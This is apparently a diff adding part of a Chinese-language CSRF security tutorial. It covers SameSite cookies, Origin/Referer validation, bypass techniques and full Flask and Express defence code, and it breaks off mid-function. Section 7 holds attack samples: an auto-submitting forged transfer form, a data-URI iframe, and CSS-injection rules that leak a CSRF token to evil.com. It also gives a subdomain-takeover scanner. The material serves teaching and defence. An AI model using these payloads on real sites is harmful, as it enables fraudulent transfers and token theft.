+        <tr><td><code><strong>Lax</strong></code></td><td>跨站 "安全" 顶层导航发送<br>其他跨站请求不发送</td><td>✅ 防御 POST/iframe/img CSRF<br>⚠️ 不防 GET 顶层导航</td><td>✅ 外链点击仍保持登录状态</td></tr>
+        <tr><td><code><strong>None</strong></code></td><td>所有请求都发送 Cookie<br>（必须配合 Secure 属性）</td><td>❌ 无 CSRF 防护</td><td>✅ 无任何影响</td></tr>
+      </tbody>
+    </table>
+
+    <h3>5.2 各请求场景下的 Cookie 发送行为</h3>
+    <table>
+      <thead><tr><th>请求场景</th><th>示例</th><th>Strict</th><th>Lax</th><th>None</th></tr></thead>
+      <tbody>
+        <tr><td>顶级导航（链接点击）</td><td><code>&lt;a href="bank.com"&gt;</code></td><td>❌</td><td>✅</td><td>✅</td></tr>
+        <tr><td>顶级导航（GET Form）</td><td><code>&lt;form method="GET"&gt;</code></td><td>❌</td><td>✅</td><td>✅</td></tr>
+        <tr><td>顶级导航（POST Form）</td><td><code>&lt;form method="POST"&gt;</code></td><td>❌</td><td>❌</td><td>✅</td></tr>
+        <tr><td>iframe 加载</td><td><code>&lt;iframe src="bank.com"&gt;</code></td><td>❌</td><td>❌</td><td>✅</td></tr>
+        <tr><td>图片加载</td><td><code>&lt;img src="bank.com/x"&gt;</code></td><td>❌</td><td>❌</td><td>✅</td></tr>
+        <tr><td>AJAX 请求</td><td><code>fetch('bank.com/api')</code></td><td>❌</td><td>❌</td><td>✅</td></tr>
+        <tr><td>script 加载</td><td><code>&lt;script src="bank.com/x"&gt;</code></td><td>❌</td><td>❌</td><td>✅</td></tr>
+      </tbody>
+    </table>
+
+    <h3>5.3 配置示例</h3>
+    <pre><code># ============================================================
+# 各语言/框架 SameSite 配置示例
+# ============================================================
+
+# --- HTTP Set-Cookie Header ---
+Set-Cookie: session_id=abc123; SameSite=Lax; Secure; HttpOnly; Path=/; Max-Age=3600
+Set-Cookie: payment_token=xyz; SameSite=Strict; Secure; HttpOnly; Path=/payment
+
+# --- Python Flask ---
+app.config.update(
+    SESSION_COOKIE_SAMESITE='Lax',
+    SESSION_COOKIE_SECURE=True,
+    SESSION_COOKIE_HTTPONLY=True,
+)
+
+# 单个 Cookie 设置
+response.set_cookie('session', value=sid, samesite='Lax', secure=True, httponly=True)
+
+# --- Node.js Express ---
+app.use(session({
+  cookie: {
+    sameSite: 'lax',   // 'strict' | 'lax' | 'none'
+    secure: true,      // SameSite=None 时必须为 true
+    httpOnly: true,
+    maxAge: 3600000
+  }
+}));
+
+# --- Java Spring ---
+# application.properties
+server.servlet.session.cookie.same-site=Lax
+server.servlet.session.cookie.secure=true
+
+# --- PHP ---
+session_set_cookie_params([
+    'lifetime' => 3600,
+    'path' => '/',
+    'secure' => true,
+    'httponly' => true,
+    'samesite' => 'Lax'
+]);
+
+# --- Nginx (代理层设置) ---
+# 为所有响应的 Set-Cookie 添加 SameSite 属性
+proxy_cookie_flags ~ samesite=lax secure;</code></pre>
+
+    <h3>5.4 SameSite 的局限性</h3>
+    <div class="info-box warning">
+      <div class="box-title">SameSite 不是银弹 —— 已知局限</div>
+      <ul>
+        <li><strong>Lax 不防 GET CSRF</strong>：如果应用有 GET 请求执行状态修改（如 <code>/delete?id=1</code>），链接跳转仍携带 Cookie</li>
+        <li><strong>Same-Site ≠ Same-Origin</strong>：<code>sub.example.com</code> 和 <code>www.example.com</code> 是同站（Same-Site），子域 XSS 可绕过</li>
+        <li><strong>Chrome 2 分钟窗口</strong>：新设置的 Lax Cookie 在前 2 分钟允许跨站 POST（为兼容 SSO/OAuth 流程）</li>
+        <li><strong>旧浏览器不支持</strong>：IE、旧版 Safari 等可能忽略 SameSite 属性</li>
+        <li><strong>第三方嵌入受影响</strong>：Strict/Lax 会破坏需要跨站 Cookie 的功能（如嵌入式支付、SSO）</li>
+      </ul>
+    </div>
+
+    <div class="info-box note">
+      <div class="box-title">浏览器默认行为变更（重要）</div>
+      <p>自 <strong>Chrome 80 (2020年2月)</strong> 起：</p>
+      <ul>
+        <li>未设置 SameSite 的 Cookie 默认按 <code>SameSite=Lax</code> 处理</li>
+        <li><code>SameSite=None</code> 必须同时设置 <code>Secure</code> 属性</li>
+        <li>这意味着大多数简单 CSRF（POST form / img / iframe）在现代浏览器中已被<strong>默认阻止</strong></li>
+        <li>Firefox 69+、Edge 80+ 也跟进了此策略</li>
+      </ul>
+    </div>
+
+    <!-- Section 6: Referer/Origin 检查 -->
+    <h2 id="referer-origin">6. Referer / Origin Header 检查</h2>
+
+    <h3>6.1 原理</h3>
+    <p>浏览器在发送请求时会自动附带 <code>Origin</code> 和/或 <code>Referer</code> 头，标明请求的来源。服务端可以检查这些头部来识别跨站请求：</p>
+
+    <pre><code># 正常请求（来自 bank.com 自身页面）:
+POST /transfer HTTP/1.1
+Host: bank.com
+Origin: https://bank.com               ← 来自自己
+Referer: https://bank.com/transfer.html
+Cookie: session=abc123
+
+# CSRF 请求（来自攻击者页面）:
+POST /transfer HTTP/1.1
+Host: bank.com
+Origin: https://evil.com               ← 来自恶意网站！
+Referer: https://evil.com/attack.html
+Cookie: session=abc123</code></pre>
+
+    <h3>6.2 Origin vs Referer 对比</h3>
+    <table>
+      <thead><tr><th>特征</th><th>Origin Header</th><th>Referer Header</th></tr></thead>
+      <tbody>
+        <tr><td><strong>内容</strong></td><td>仅 scheme + host + port<br><code>https://evil.com</code></td><td>完整 URL（含路径）<br><code>https://evil.com/attack.html?x=1</code></td></tr>
+        <tr><td><strong>发送时机</strong></td><td>POST/PUT/DELETE 请求<br>CORS 跨域请求</td><td>大多数请求（可被策略控制）</td></tr>
+        <tr><td><strong>可否被 JS 修改</strong></td><td>❌ 不可修改（浏览器强制）</td><td>❌ 不可直接修改</td></tr>
+        <tr><td><strong>可否被抑制</strong></td><td>极少数情况缺失<br>（如 302 重定向后）</td><td>✅ 可通过 Referrer-Policy 完全抑制</td></tr>
+        <tr><td><strong>隐私影响</strong></td><td>低（不含路径信息）</td><td>高（含完整 URL，可能泄露隐私）</td></tr>
+        <tr><td><strong>推荐度</strong></td><td>⭐⭐⭐⭐⭐ 优先使用</td><td>⭐⭐⭐ 作为 Origin 缺失时的备选</td></tr>
+      </tbody>
+    </table>
+
+    <h3>6.3 验证实现</h3>
+    <pre><code>from urllib.parse import urlparse
+
+ALLOWED_ORIGINS = {
+    'https://bank.com',
+    'https://www.bank.com',
+    'https://app.bank.com',
+}
+
+def validate_request_origin(request):
+    """
+    验证请求来源（Origin/Referer）
+    返回 True 表示来源合法，False 表示可疑
+    """
+    # 安全方法不需要检查
+    if request.method in ('GET', 'HEAD', 'OPTIONS'):
+        return True
+
+    # 优先检查 Origin header（更可靠）
+    origin = request.headers.get('Origin')
+    if origin:
+        if origin in ALLOWED_ORIGINS:
+            return True
+        else:
+            log_warning(f"Blocked request with invalid Origin: {origin}")
+            return False
+
+    # Origin 缺失时，检查 Referer
+    referer = request.headers.get('Referer')
+    if referer:
+        try:
+            parsed = urlparse(referer)
+            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
+            if referer_origin in ALLOWED_ORIGINS:
+                return True
+            else:
+                log_warning(f"Blocked request with invalid Referer: {referer}")
+                return False
+        except Exception:
+            return False
+
+    # Origin 和 Referer 都缺失
+    # 严格策略：拒绝（推荐）
+    # 宽松策略：放行（不推荐，攻击者可利用）
+    log_warning("Request missing both Origin and Referer headers")
+    return False  # 严格模式：默认拒绝</code></pre>
+
+    <h3>6.4 常见验证错误</h3>
+    <pre><code># ❌ 错误1：使用 contains/in 检查（可被绕过）
+def bad_check_1(origin):
+    return 'bank.com' in origin
+    # 绕过: origin = "https://bank.com.evil.com"
+    # 绕过: origin = "https://notbank.com"
+
+# ❌ 错误2：使用 startswith 检查
+def bad_check_2(origin):
+    return origin.startswith('https://bank.com')
+    # 绕过: origin = "https://bank.com.evil.com"
+
+# ❌ 错误3：使用 endswith 检查
+def bad_check_3(origin):
+    return origin.endswith('bank.com')
+    # 绕过: origin = "https://evilbank.com"
+
+# ❌ 错误4：正则表达式不严格
+import re
+def bad_check_4(origin):
+    return bool(re.match(r'https://.*bank\.com', origin))
+    # 绕过: origin = "https://evil-bank.com"
+
+# ✅ 正确：精确匹配白名单
+def good_check(origin):
+    return origin in {'https://bank.com', 'https://www.bank.com'}</code></pre>
+
+    <div class="info-box warning">
+      <div class="box-title">Origin/Referer 检查的局限</div>
+      <ul>
+        <li><strong>不能作为唯一防御</strong>：应与 CSRF Token 配合使用</li>
+        <li><strong>Referer 可被移除</strong>：<code>&lt;meta name="referrer" content="no-referrer"&gt;</code></li>
+        <li><strong>某些浏览器/隐私模式</strong>可能不发送这些头部</li>
+        <li><strong>如果对缺失情况放行</strong>，攻击者可以利用 Referrer-Policy 移除 Referer 来绕过</li>
+      </ul>
+    </div>
+
+    <!-- Section 7: 防御绕过 -->
+    <h2 id="bypass">7. CSRF 防御绕过技术</h2>
+
+    <h3>7.1 Token 未被验证（最常见！）</h3>
+    <p>服务端代码中存在 CSRF Token 机制，但验证逻辑有缺陷或被遗忘：</p>
+    <pre><code># 漏洞场景1：Token 存在但根本没有验证代码
+def transfer(request):
+    # 前端表单有 csrf_token 字段，但后端从未检查！
+    to = request.POST.get('to')
+    amount = request.POST.get('amount')
+    execute_transfer(request.user, to, amount)
+    # 测试：删除请求中的 csrf_token 参数，操作仍然成功
+
+# 漏洞场景2：验证逻辑可跳过（Token 缺失时不检查）
+def transfer(request):
+    csrf_token = request.POST.get('csrf_token')
+    if csrf_token:  # ← 致命错误！Token 不存在时直接跳过检查
+        if csrf_token != session.get('csrf_token'):
+            return HttpResponse(status=403)
+    # 攻击：请求中不发送 csrf_token 参数即可绕过
+
+# 漏洞场景3：仅对特定 HTTP method 验证
+def transfer(request):
+    if request.method == 'POST':
+        validate_csrf(request)
+    # 但应用同时支持 PUT 方法执行相同操作...
+    # 攻击：使用 PUT 方法绕过（如果框架允许表单发 PUT）</code></pre>
+
+    <p><strong>渗透测试方法：</strong></p>
+    <pre><code># 测试清单：
+# 1. 删除 Token 参数 → 请求是否仍被接受？
+# 2. 发送空 Token → csrf_token=
+# 3. 发送任意值 → csrf_token=aaaa
+# 4. 使用其他用户的有效 Token
+# 5. 改变 HTTP 方法（POST → PUT/PATCH/DELETE）
+# 6. 改变 Content-Type（application/json → urlencoded）</code></pre>
+
+    <h3>7.2 Token 未绑定用户 Session</h3>
+    <pre><code># 漏洞：使用全局 Token 池，任何有效 Token 都能通过验证
+valid_tokens = set()  # 全局 Token 池
+
+def generate_token():
+    token = secrets.token_hex(32)
+    valid_tokens.add(token)  # 加入全局池
+    return token
+
+def validate_token(token):
+    return token in valid_tokens  # 不检查 Token 属于哪个用户！
+
+# 攻击步骤：
+# 1. 攻击者注册账号并登录
+# 2. 访问包含表单的页面，获取自己的有效 CSRF Token
+# 3. 将该 Token 嵌入恶意页面中
+# 4. 受害者访问恶意页面，使用攻击者的 Token 提交请求 → 验证通过！
+
+# 恶意页面：
+# &lt;form action="https://bank.com/transfer" method="POST"&gt;
+#   &lt;input name="csrf_token" value="attackers-valid-token-from-his-session"&gt;
+#   &lt;input name="to" value="attacker"&gt;
+#   &lt;input name="amount" value="100000"&gt;
+# &lt;/form&gt;</code></pre>
+
+    <h3>7.3 Token 仅在 Cookie 中（无双重验证）</h3>
+    <pre><code># 漏洞：只检查 Cookie 中是否有 Token，不与请求体对比
+def transfer(request):
+    cookie_token = request.COOKIES.get('csrf_token')
+    if not cookie_token:
+        return HttpResponse(status=403)
+    # 只验证了 Cookie 中"存在" Token，没有与请求体中的值对比
+    # Cookie 由浏览器自动发送，攻击者不需要知道 Token 值！
+    execute_transfer(request.user, ...)
+
+# 正确做法：
+def transfer(request):
+    cookie_token = request.COOKIES.get('csrf_token')
+    body_token = request.POST.get('csrf_token')  # 或 Header
+    if not cookie_token or not body_token:
+        return HttpResponse(status=403)
+    if not hmac.compare_digest(cookie_token, body_token):
+        return HttpResponse(status=403)  # 两者必须匹配
+    execute_transfer(request.user, ...)</code></pre>
+
+    <h3>7.4 Referer 验证绕过</h3>
+    <pre><code>&lt;!-- 方式1：完全移除 Referer（如果服务端对缺失情况放行） --&gt;
+&lt;meta name="referrer" content="no-referrer"&gt;
+&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to" value="attacker"&gt;
+  &lt;input type="hidden" name="amount" value="100000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+
+&lt;!-- 方式2：利用 rel="noreferrer" --&gt;
+&lt;a rel="noreferrer" href="..." &gt;...&lt;/a&gt;
+
+&lt;!-- 方式3：利用 data: URI（某些浏览器不发送 Referer） --&gt;
+&lt;iframe src="data:text/html;base64,PGZvcm0gYWN0aW9uPSdodHRwczov..."&gt;
+&lt;/iframe&gt;
+
+&lt;!-- 方式4：利用验证逻辑缺陷 --&gt;
+&lt;!-- 如果服务端使用: if 'bank.com' in referer --&gt;
+&lt;!-- 攻击者使用域名: bank.com.evil.com --&gt;
+&lt;!-- 或文件路径: evil.com/page/bank.com/x --&gt;
+
+&lt;!-- 方式5：利用 HTTPS → HTTP 降级 --&gt;
+&lt;!-- 如果 bank.com 有 HTTP 版本，HTTPS→HTTP 不发送 Referer --&gt;
+&lt;!-- 但这种场景在 HSTS 普及后越来越少 --&gt;</code></pre>
+
+    <h3>7.5 子域名接管（Subdomain Takeover）</h3>
+    <p>子域名接管可以同时绕过 SameSite Cookie 和 Origin/Referer 检查：</p>
+
+    <div class="diagram">
+<pre>
+┌─────────────────────────────────────────────────────────────────────────┐
+│              子域名接管绕过 CSRF 防御的完整攻击链                          │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  前提: bank.com 的子域 old-blog.bank.com                                │
+│        CNAME 指向 github-pages.github.io（已被释放）                     │
+│                                                                         │
+│  Step 1: 攻击者发现悬挂 CNAME                                           │
+│  ┌─────────────────────────────────────────────────┐                   │
+│  │  $ dig old-blog.bank.com CNAME                  │                   │
+│  │  old-blog.bank.com. → some-org.github.io.       │                   │
+│  │                                                 │                   │
+│  │  $ curl https://old-blog.bank.com               │                   │
+│  │  404 - "There isn't a GitHub Pages site here"   │                   │
+│  └─────────────────────────────────────────────────┘                   │
+│                                                                         │
+│  Step 2: 攻击者注册该 GitHub Pages 项目，控制 old-blog.bank.com          │
+│                                                                         │
+│  Step 3: 利用同站关系绕过防御                                            │
+│  ┌─────────────────────────────────────────────────┐                   │
+│  │  • old-blog.bank.com 与 bank.com 是同站(Same-Site)│                  │
+│  │    → SameSite=Lax 的 Cookie 会被发送！           │                   │
+│  │                                                 │                   │
+│  │  • Origin: https://old-blog.bank.com            │                   │
+│  │    → 如果 Origin 检查允许 *.bank.com，则通过      │                   │
+│  │                                                 │                   │
+│  │  • 攻击者可以为 .bank.com 设置 Cookie            │                   │
+│  │    → 可覆盖 Double Submit Cookie 中的 Token      │                   │
+│  └─────────────────────────────────────────────────┘                   │
+│                                                                         │
+│  结果: 所有基于 "同站" 假设的防御全部失效                                 │
+└─────────────────────────────────────────────────────────────────────────┘
+</pre>
+    </div>
+
+    <pre><code># 子域名接管检测脚本
+import dns.resolver
+import requests
+
+target_domain = 'bank.com'
+subdomains = ['old-blog', 'staging', 'dev', 'test', 'api-v1', 'shop', 'mail']
+
+# 已知可接管的第三方服务 CNAME 特征
+TAKEOVER_SIGNATURES = {
+    'github.io': 'There isn\'t a GitHub Pages site here',
+    'herokuapp.com': 'No such app',
+    'amazonaws.com': 'NoSuchBucket',
+    'azurewebsites.net': 'Error 404 - Web app not found',
+    'cloudfront.net': 'ERROR: The request could not be satisfied',
+    'shopify.com': 'Sorry, this shop is currently unavailable',
+    'surge.sh': 'project not found',
+    'zendesk.com': 'Help Center Closed',
+}
+
+for sub in subdomains:
+    fqdn = f"{sub}.{target_domain}"
+    try:
+        answers = dns.resolver.resolve(fqdn, 'CNAME')
+        for answer in answers:
+            cname = str(answer.target).rstrip('.')
+            for service, signature in TAKEOVER_SIGNATURES.items():
+                if service in cname:
+                    try:
+                        r = requests.get(f"https://{fqdn}", timeout=10)
+                        if signature in r.text:
+                            print(f"[VULNERABLE] {fqdn} -> {cname}")
+                            print(f"  Signature match: '{signature}'")
+                    except requests.exceptions.RequestException:
+                        print(f"[POSSIBLE] {fqdn} -> {cname} (connection failed)")
+    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers):
+        pass</code></pre>
+
+    <h3>7.6 Token 泄露途径</h3>
+    <table>
+      <thead><tr><th>泄露途径</th><th>说明</th><th>利用条件</th><th>防御措施</th></tr></thead>
+      <tbody>
+        <tr><td><strong>XSS</strong></td><td>注入JS直接读取页面中的Token</td><td>存在 XSS 漏洞</td><td>修复 XSS（最重要）</td></tr>
+        <tr><td><strong>URL 泄露</strong></td><td>Token 在 URL 中通过 Referer 泄露</td><td>Token 放在 query string</td><td>Token 放在 POST body 或 Header</td></tr>
+        <tr><td><strong>CORS 错误配置</strong></td><td>跨域读取含 Token 的页面</td><td>宽松的 CORS 策略</td><td>严格配置 CORS 白名单</td></tr>
+        <tr><td><strong>CSS 注入</strong></td><td>利用属性选择器逐字符泄露</td><td>存在 CSS 注入点</td><td>CSP 限制内联样式</td></tr>
+        <tr><td><strong>浏览器历史</strong></td><td>URL 中的 Token 被记录</td><td>物理访问设备</td><td>Token 不放 URL</td></tr>
+        <tr><td><strong>服务器日志</strong></td><td>URL 参数记录在日志中</td><td>日志泄露/内部人员</td><td>Token 不放 URL</td></tr>
+        <tr><td><strong>中间人攻击</strong></td><td>HTTP 明文传输时截获</td><td>不使用 HTTPS</td><td>强制 HTTPS + HSTS</td></tr>
+      </tbody>
+    </table>
+
+    <p><strong>CSS 注入窃取 Token 示例（高级攻击）：</strong></p>
+    <pre><code>&lt;!-- 如果页面存在 CSS 注入漏洞，且 Token 在 input[value] 属性中 --&gt;
+&lt;style&gt;
+  /* CSS 属性选择器可以匹配以特定字符开头的属性值 */
+  /* 匹配成功时加载外部资源，从而泄露 Token 前缀 */
+
+  input[name="csrf_token"][value^="a"] { background: url('https://evil.com/leak?char1=a'); }
+  input[name="csrf_token"][value^="b"] { background: url('https://evil.com/leak?char1=b'); }
+  input[name="csrf_token"][value^="c"] { background: url('https://evil.com/leak?char1=c'); }
+  /* ... 对 0-9, a-f 每个字符都生成规则 ... */
+
+  /* 第二轮：已知第一个字符后，继续探测第二个字符 */
+  input[name="csrf_token"][value^="a0"] { background: url('https://evil.com/leak?prefix=a0'); }
+  input[name="csrf_token"][value^="a1"] { background: url('https://evil.com/leak?prefix=a1'); }
+  /* ... 需要多轮请求逐步获取完整 Token ... */
+&lt;/style&gt;
+
+&lt;!-- 防御：使用 CSP 禁止内联样式和外部资源加载 --&gt;</code></pre>
+
+    <h3>7.7 绕过方法总结矩阵</h3>
+    <table>
+      <thead><tr><th>防御措施</th><th>绕过方法</th><th>利用条件</th><th>难度</th></tr></thead>
+      <tbody>
+        <tr><td>CSRF Token</td><td>Token 验证逻辑缺陷</td><td>实现错误（最常见）</td><td>低</td></tr>
+        <tr><td>CSRF Token</td><td>XSS 读取 Token</td><td>存在 XSS 漏洞</td><td>中</td></tr>
+        <tr><td>CSRF Token</td><td>Token 不绑定 Session</td><td>使用全局 Token 池</td><td>低</td></tr>
+        <tr><td>Double Submit</td><td>子域名 Cookie 注入/覆盖</td><td>子域名可控</td><td>中</td></tr>
+        <tr><td>Referer 检查</td><td>移除 Referer (no-referrer)</td><td>服务端对缺失放行</td><td>低</td></tr>
+        <tr><td>Referer 检查</td><td>正则匹配绕过</td><td>验证逻辑不严格</td><td>低</td></tr>
+        <tr><td>Origin 检查</td><td>利用 Origin 缺失的场景</td><td>服务端对缺失放行</td><td>中</td></tr>
+        <tr><td>SameSite=Lax</td><td>GET 型状态修改操作</td><td>GET 请求可触发操作</td><td>低</td></tr>
+        <tr><td>SameSite=Lax</td><td>子域名攻击（Same-Site）</td><td>子域名可控</td><td>中</td></tr>
+        <tr><td>SameSite=Lax</td><td>2分钟 POST 宽限窗口</td><td>Chrome + 新 Cookie</td><td>高</td></tr>
+        <tr><td>所有防御</td><td>子域名接管 + Cookie 注入</td><td>存在悬挂 DNS 记录</td><td>中</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 8: 完整防御代码 -->
+    <h2 id="defense-code">8. 完整防御代码示例</h2>
+
+    <h3>8.1 Python Flask 完整 CSRF 防御</h3>
+    <pre><code>"""
+Flask CSRF 完整防御实现
+包含：Token 生成/验证、中间件、Origin检查、模板集成、Cookie配置
+"""
+import os
+import hmac
+import hashlib
+import secrets
+import logging
+from functools import wraps
+from urllib.parse import urlparse
+from flask import Flask, request, session, abort, render_template_string, g
+
+app = Flask(__name__)
+app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
+logger = logging.getLogger(__name__)
+
+# ============================================================
+# 配置
+# ============================================================
+
+CSRF_CONFIG = {
+    'TOKEN_LENGTH': 32,            # Token 字节长度
+    'HEADER_NAME': 'X-CSRF-Token', # 自定义 Header 名
+    'FIELD_NAME': 'csrf_token',    # 表单字段名
+    'SAFE_METHODS': frozenset(['GET', 'HEAD', 'OPTIONS', 'TRACE']),
+    'EXEMPT_PATHS': ['/webhook/stripe', '/webhook/github', '/api/public/'],
+    'ALLOWED_ORIGINS': {
+        'https://bank.com',
+        'https://www.bank.com',
+    },
+    'COOKIE_SAMESITE': 'Lax',
+    'COOKIE_SECURE': True,
+    'COOKIE_HTTPONLY': True,
+}
+
+# ============================================================
+# CSRF Token 核心逻辑
+# ============================================================
+
+def generate_csrf_token():
+    """生成与当前 Session 绑定的 CSRF Token"""
+    if 'csrf_token' not in session:
+        session['csrf_token'] = secrets.token_hex(CSRF_CONFIG['TOKEN_LENGTH'])
+    return session['csrf_token']
+
+def validate_csrf_token(token):
+    """
+    验证 CSRF Token
+    使用时间恒定比较防止 Timing Attack
+    """
+    expected = session.get('csrf_token', '')
+    if not expected or not token:
+        return False
+    # hmac.compare_digest 是时间恒定的比较函数
+    return hmac.compare_digest(token, expected)
+
+# ============================================================
+# Origin/Referer 验证
+# ============================================================
+
+def validate_origin():
+    """验证请求来源（作为额外防护层）"""
+    origin = request.headers.get('Origin')
+    if origin:
+        if origin not in CSRF_CONFIG['ALLOWED_ORIGINS']:
+            logger.warning(f"Invalid Origin: {origin} for {request.path}")
+            return False
+        return True
+
+    # Origin 缺失时检查 Referer
+    referer = request.headers.get('Referer')
+    if referer:
+        try:
+            parsed = urlparse(referer)
+            referer_origin = f"{parsed.scheme}://{parsed.netloc}"
+            if referer_origin not in CSRF_CONFIG['ALLOWED_ORIGINS']:
+                logger.warning(f"Invalid Referer: {referer} for {request.path}")
+                return False
+            return True
+        except Exception:
+            return False
+
+    # 两者都缺失 —— 记录但不拒绝（由 CSRF Token 兜底）
+    logger.info(f"Missing Origin/Referer for {request.method} {request.path}")
+    return True  # 依赖 CSRF Token 作为主要防御
+
+# ============================================================
+# CSRF 中间件
+# ============================================================
+
+@app.before_request
+def csrf_protect():
+    """全局 CSRF 保护中间件"""
+    # 安全方法不需要 CSRF 验证
+    if request.method in CSRF_CONFIG['SAFE_METHODS']:
+        return
+
+    # 豁免路径（如 Webhook 回调，这些请求使用签名验证）
+    if any(request.path.startswith(p) for p in CSRF_CONFIG['EXEMPT_PATHS']):
+        return
+
+    # 第一层：Origin/Referer 验证
+    if not validate_origin():
+        abort(403, description="Request origin not allowed")
+
+    # 第二层：CSRF Token 验证（核心防线）
+    token = (
+        request.form.get(CSRF_CONFIG['FIELD_NAME'])       # 表单字段
+        or request.headers.get(CSRF_CONFIG['HEADER_NAME']) # 自定义 Header
+        or request.headers.get('X-XSRF-Token')            # Angular 风格
+    )
+
+    if not validate_csrf_token(token):
+        logger.warning(
+            f"CSRF validation failed: {request.method} {request.path} "
+            f"IP={request.remote_addr} "
+            f"Origin={request.headers.get('Origin', 'N/A')} "
+            f"UA={request.headers.get('User-Agent', 'N/A')[:100]}"
+        )
+        abort(403, description="CSRF token validation failed")
+
+# ============================================================
+# 模板辅助（自动注入 Token）
+# ============================================================
+
+@app.context_processor
+def inject_csrf():
+    """在所有模板中自动提供 csrf_token 和辅助函数"""
+    token = generate_csrf_token()
+
+    def csrf_hidden_field():
+        """生成隐藏的 CSRF 表单字段"""
+        return f'&lt;input type="hidden" name="{CSRF_CONFIG["FIELD_NAME"]}" value="{token}"&gt;'
+
+    def csrf_meta_tag():
+        """生成 meta 标签（供 AJAX 使用）"""
+        return f'&lt;meta name="csrf-token" content="{token}"&gt;'
+
+    return dict(
+        csrf_token=token,
+        csrf_field=csrf_hidden_field,
+        csrf_meta=csrf_meta_tag
+    )
+
+# ============================================================
+# 安全响应头 & Cookie 配置
+# ============================================================
+
+@app.after_request
+def security_headers(response):
+    """设置安全响应头"""
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    response.headers['X-XSS-Protection'] = '0'  # 现代浏览器推荐关闭
+    return response
+
+# Session Cookie 安全配置
+app.config.update(
+    SESSION_COOKIE_SAMESITE='Lax',
+    SESSION_COOKIE_SECURE=True,
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_NAME='__Host-session',  # __Host- 前缀增强安全
+    PERMANENT_SESSION_LIFETIME=3600,
+)
+
+# ============================================================
+# 使用示例
+# ============================================================
+
+TRANSFER_FORM = """
+&lt;html&gt;
+&lt;head&gt;{{ csrf_meta() | safe }}&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;转账&lt;/h1&gt;
+  &lt;form method="POST" action="/transfer"&gt;
+    {{ csrf_field() | safe }}
+    &lt;label&gt;收款人：&lt;input name="to" required&gt;&lt;/label&gt;&lt;br&gt;
+    &lt;label&gt;金额：&lt;input name="amount" type="number" required&gt;&lt;/label&gt;&lt;br&gt;
+    &lt;button type="submit"&gt;确认转账&lt;/button&gt;
+  &lt;/form&gt;
+
+  &lt;h2&gt;AJAX 示例&lt;/h2&gt;
+  &lt;script&gt;
+    // 从 meta 标签获取 Token
+    const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
+
+    async function ajaxTransfer() {
+      const response = await fetch('/api/transfer', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRF-Token': csrfToken
+        },
+        credentials: 'same-origin',
+        body: JSON.stringify({ to: 'alice', amount: 100 })
+      });
+      return response.json();
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+"""
+
+@app.route('/transfer', methods=['GET', 'POST'])
+def transfer():
+    if request.method == 'GET':
+        return render_template_string(TRANSFER_FORM)
+    # POST: 到达此处说明 CSRF 验证已通过
+    to = request.form.get('to')
+    amount = request.form.get('amount')
+    return f"转账成功：向 {to} 转账 {amount} 元"
+
+@app.route('/api/transfer', methods=['POST'])
+def api_transfer():
+    """JSON API 路由"""
+    data = request.get_json()
+    return {'status': 'success', 'to': data['to'], 'amount': data['amount']}
+
+if __name__ == '__main__':
+    app.run(ssl_context='adhoc')  # 启用 HTTPS</code></pre>
+
+    <h3>8.2 Node.js Express 完整 CSRF 防御</h3>
+    <pre><code>/**
+ * Express.js CSRF 完整防御实现
+ * 包含：Token 生成/验证、中间件、Origin检查、SPA支持、安全Cookie
+ */
+
+const express = require('express');
+const crypto = require('crypto');
+const cookieParser = require('cookie-parser');
+const session = require('express-session');
+
+const app = express();
+
+// ============================================================
+// 基础配置
+// ============================================================
+
+const CONFIG = {
+  ALLOWED_ORIGINS: ['https://bank.com', 'https://www.bank.com'],
+  EXEMPT_PATHS: ['/webhook/stripe', '/webhook/github'],
+  TOKEN_HEADER: 'x-csrf-token',
+  TOKEN_FIELD: '_csrf',
+  TOKEN_COOKIE: 'XSRF-TOKEN',
+  SAFE_METHODS: new Set(['GET', 'HEAD', 'OPTIONS']),
+};
+
+// ============================================================
+// 基础中间件
+// ============================================================
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(cookieParser());
+app.use(session({
+  name: '__Host-session',
+  secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'lax',
+    maxAge: 3600000,
+    path: '/'
+  }
+}));
+
+// ============================================================
+// CSRF Token 核心模块
+// ============================================================
+
+class CSRFProtection {
+  /**
+   * 生成 CSRF Token 并存入 Session
+   */
+  static generateToken(req) {
+    if (!req.session.csrfToken) {
+      req.session.csrfToken = crypto.randomBytes(32).toString('hex');
+    }
+    return req.session.csrfToken;
+  }
+
+  /**
+   * 时间恒定比较（防 Timing Attack）
+   */
+  static safeCompare(a, b) {
+    if (!a || !b) return false;
+    if (a.length !== b.length) return false;
+    try {
+      return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
+    } catch {
+      return false;
+    }
+  }
+
+  /**
+   * 从请求中提取客户端提交的 Token
+   */
+  static extractToken(req) {
+    return (
+      req.headers[CONFIG.TOKEN_HEADER] ||    // 自定义 Header（推荐）
+      req.body?.[CONFIG.TOKEN_FIELD] ||      // 表单字段
+      req.headers['x-xsrf-token'] ||         // Angular 风格
+      null
+    );
+  }
+
+  /**
+   * 验证 Token
+   */
+  static validateToken(req, clientToken) {
+    const serverToken = req.session?.csrfToken;
+    return this.safeCompare(clientToken, serverToken);
+  }
+}
+
+// ============================================================
+// Origin/Referer 验证中间件
+// ============================================================
+
+function originCheckMiddleware(req, res, next) {
+  if (CONFIG.SAFE_METHODS.has(req.method)) return next();
